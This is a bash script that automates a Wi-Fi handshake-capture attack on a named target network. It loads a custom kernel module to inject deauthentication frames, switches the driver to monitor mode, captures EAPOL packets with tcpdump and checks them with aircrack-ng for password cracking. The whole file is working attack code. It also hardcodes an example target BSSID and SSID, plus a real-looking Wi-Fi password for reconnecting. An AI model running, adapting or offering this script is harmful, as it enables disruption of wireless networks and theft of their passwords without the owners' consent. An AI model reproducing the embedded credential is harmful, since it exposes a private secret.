#!/bin/bash
# grab_hs4.sh - Optimized two-phase handshake capture
# Usage: sudo bash /tmp/grab_hs4.sh <BSSID> <SSID> <CHANNEL>

BSSID="$1"
SSID="$2"
CH="$3"

if [ -z "$BSSID" ] || [ -z "$SSID" ] || [ -z "$CH" ]; then
    echo "Usage: $0 <BSSID> <SSID> <CHANNEL>"
    echo "Example: $0 8C:F0:DF:1F:4F:C7 Flymodem2631 7"
    exit 1
fi

case "$CH" in
    1) FREQ=2412;; 2) FREQ=2417;; 3) FREQ=2422;; 4) FREQ=2427;;
    5) FREQ=2432;; 6) FREQ=2437;; 7) FREQ=2442;; 8) FREQ=2447;;
    9) FREQ=2452;; 10) FREQ=2457;; 11) FREQ=2462;; 12) FREQ=2467;; 13) FREQ=2472;;
    36) FREQ=5180;; 40) FREQ=5200;; 44) FREQ=5220;; 48) FREQ=5240;;
    *) FREQ=$((2407 + CH * 5));;
esac

DRIVER="/tmp/qca_cld3_wlan.ko"

echo "[*] Target: $BSSID ($SSID) ch$CH ($FREQ MHz)"

cd /tmp
[ -f petx5.ko ] || { as -o petx5.o petx5.S && ld -r -o petx5.ko petx5.o; }

# Prepare wpa config
cat > /tmp/wpa_t.conf << EOF
ctrl_interface=/tmp/wpa_ctrl
network={
    ssid="$SSID"
    bssid=$BSSID
    psk="dummypassword1234567890123456"
    key_mgmt=WPA-PSK
    scan_ssid=1
}
EOF

rm -f /tmp/hs_fast*.pcap

for round in 1 2 3 4 5 6; do
    echo ""
    echo "=== Round $round/6 ==="

    # --- PHASE 1: STA mode + deauth ---
    killall wpa_supplicant 2>/dev/null
    systemctl stop NetworkManager 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 1

    insmod "$DRIVER"
    sleep 3

    # Don't bother with scan - use known SSID directly
    ip link set wlan0 up
    wpa_supplicant -i wlan0 -c /tmp/wpa_t.conf -B 2>/dev/null

    # Wait for PE session (check petx5 can find it)
    PE_FOUND=0
    for wait in $(seq 1 30); do
        sleep 0.3
        rmmod kfind 2>/dev/null
        insmod /tmp/petx5.ko 2>/dev/null
        if dmesg | tail -3 | grep -q "calling lim_send"; then
            PE_FOUND=1
            echo "[*] PE session found after ${wait}x0.3s"
            break
        fi
    done

    if [ $PE_FOUND -eq 0 ]; then
        echo "[!] No PE session found, retrying..."
        continue
    fi

    # Rapid deauth burst - send as many as possible
    SENT=1  # Already sent one above
    for i in $(seq 1 15); do
        rmmod kfind 2>/dev/null
        insmod /tmp/petx5.ko 2>/dev/null
        if dmesg | tail -2 | grep -q "calling lim_send"; then
            SENT=$((SENT + 1))
        fi
        sleep 0.05
    done
    echo "[*] Deauths sent: $SENT"

    # --- PHASE 2: Monitor mode capture ---
    # Kill STA as fast as possible
    killall wpa_supplicant 2>/dev/null
    rmmod wlan
    sleep 1
    insmod "$DRIVER" con_mode_monitor=4
    sleep 2
    ip link set wlan0 up 2>/dev/null
    iw dev wlan0 set freq $FREQ 2>/dev/null

    T_START=$(date +%s)
    echo "[*] Capturing on $FREQ MHz ($(date +%H:%M:%S))..."
    timeout 30 tcpdump -i wlan0 -w /tmp/hs_fast${round}.pcap 2>/dev/null
    T_END=$(date +%s)

    EAPOL=$(tcpdump -r /tmp/hs_fast${round}.pcap -n 2>/dev/null | grep -ci "eapol\|802.1X")
    TOTAL=$(tcpdump -r /tmp/hs_fast${round}.pcap -n 2>/dev/null | wc -l)
    echo "[*] $EAPOL EAPOL / $TOTAL total in $((T_END-T_START))s"

    if [ "$EAPOL" -gt 0 ]; then
        echo "[!!!] EAPOL FOUND!"
        aircrack-ng /tmp/hs_fast${round}.pcap 2>&1 | head -15
        HS=$(aircrack-ng /tmp/hs_fast${round}.pcap 2>&1 | grep -c "1 handshake")
        if [ "$HS" -gt 0 ]; then
            echo "[!!!] HANDSHAKE CAPTURED! => /tmp/hs_fast${round}.pcap"
            cp /tmp/hs_fast${round}.pcap /tmp/handshake_${SSID}.pcap
            rmmod wlan 2>/dev/null; sleep 1; insmod "$DRIVER"; sleep 3
            systemctl start NetworkManager 2>/dev/null
            nmcli device wifi connect 8C:DE:F9:B3:9E:20 password 9006609b29404a ifname wlan0 2>/dev/null
            exit 0
        fi
    fi
done

echo ""
echo "[*] All rounds complete. Merging..."
mergecap -w /tmp/hs_result.pcap /tmp/hs_fast*.pcap 2>/dev/null
aircrack-ng /tmp/hs_result.pcap 2>&1 | head -20

echo "[*] Restoring WiFi..."
rmmod wlan 2>/dev/null; sleep 1; insmod "$DRIVER"; sleep 3
systemctl start NetworkManager 2>/dev/null; sleep 2
nmcli device wifi connect 8C:DE:F9:B3:9E:20 password 9006609b29404a ifname wlan0 2>/dev/null
echo "[*] Done."
